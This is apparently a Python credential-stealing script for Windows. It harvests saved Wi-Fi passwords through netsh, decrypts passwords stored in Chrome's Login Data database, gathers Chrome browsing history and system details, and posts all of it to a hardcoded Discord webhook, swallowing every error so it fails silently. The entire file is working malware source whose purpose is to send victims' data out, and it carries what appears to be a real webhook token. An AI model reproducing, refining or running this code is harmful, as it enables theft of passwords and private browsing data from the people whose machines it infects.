#!/usr/bin/python
import os
import re
import sqlite3
import platform
import uuid
import requests
import json
import win32crypt
import socket  # Missing import
import sys     # Missing import
from collections import OrderedDict

# DISCORD WEBHOOK
WEBHOOK_URL = "https://discord.com/api/webhooks/1406777013909323967/Gu2KL4c1jclX3lzXgvaaSh2PSNjfe-MWFMr3nU8jJwnJxAgw4ObCiM1pxanM6c8PHYGS"

def send_to_discord(filename, content):
    try:
        files = {'file': (filename, content)}
        requests.post(WEBHOOK_URL, files=files)
    except Exception as e:
        pass  # Silent failure

def get_system_info():
    info = f"""
    System Info:
    Name: {socket.gethostname()}
    FQDN: {socket.getfqdn()}
    Platform: {sys.platform}
    Machine: {platform.machine()}
    Processor: {platform.processor()}
    OS: {platform.system()}
    Release: {platform.release()}
    Version: {platform.version()}
    """
    return info

def extract_wifi():
    def get_wlans():
        try:
            data = os.popen("netsh wlan show profiles").read()
            return re.findall(r"All User Profile\s*:\s(.*)", data)
        except:
            return []

    def get_pass(network):
        try:
            cmd = f'netsh wlan show profile name="{network}" key=clear'
            wlan = os.popen(cmd).read()
            match = re.search(r"Key Content\s*:\s(.*)", wlan)
            return match.group(1).strip() if match else "N/A"
        except:
            return "N/A"

    wifi_data = ""
    for wlan in get_wlans():
        wifi_data += f"SSID: {wlan}\nPassword: {get_pass(wlan)}\n---\n"
    if wifi_data:
        send_to_discord("wifi.txt", wifi_data)

def extract_chrome_passwords():
    temp_path = None
    try:
        localappdata = os.getenv('LOCALAPPDATA')
        if not localappdata:
            return
        data_path = os.path.join(localappdata, 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
        if not os.path.exists(data_path):
            return

        temp_env = os.getenv('TEMP')
        if not temp_env:
            return
        temp_path = os.path.join(temp_env, 'chrome_temp.db')
        open(temp_path, 'a').close()  # Create empty file if doesn't exist
        with open(data_path, 'rb') as f1, open(temp_path, 'wb') as f2:
            f2.write(f1.read())

        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')

        passwords = ""
        for site, user, encrypted_pass in cursor.fetchall():
            try:
                decrypted = win32crypt.CryptUnprotectData(encrypted_pass, None, None, None, 0)[1]
                passwords += f"URL: {site}\nUser: {user}\nPass: {decrypted.decode('utf-8')}\n---\n"
            except:
                continue

        if passwords:
            send_to_discord("chrome_passwords.txt", passwords)

    except Exception as e:
        pass
    finally:
        if temp_path and os.path.exists(temp_path):
            os.remove(temp_path)

def extract_chrome_history():
    try:
        localappdata = os.getenv('LOCALAPPDATA')
        if not localappdata:
            return
        history_db = os.path.join(localappdata, 'Google', 'Chrome', 'User Data', 'Default', 'history')
        if not os.path.exists(history_db):
            return

        def parse(url):
            try:
                return url.split('//')[1].split('/')[0].replace("www.", "")
            except:
                return url[:50]  # Return first 50 chars if parsing fails

        conn = sqlite3.connect(history_db)
        cursor = conn.cursor()
        cursor.execute("SELECT url, visit_count FROM urls ORDER BY visit_count DESC LIMIT 100")
        
        history = OrderedDict()
        for url, count in cursor.fetchall():
            domain = parse(url)
            history[domain] = history.get(domain, 0) + count
            
        if history:
            sorted_history = "\n".join(f"{site}: {visits}" for site, visits in history.items())
            send_to_discord("chrome_history.txt", sorted_history)
            
    except Exception as e:
        pass

if __name__ == "__main__":
    try:
        extract_wifi()
        extract_chrome_passwords()
        extract_chrome_history()
        send_to_discord("system_info.txt", get_system_info())
    except:
        pass
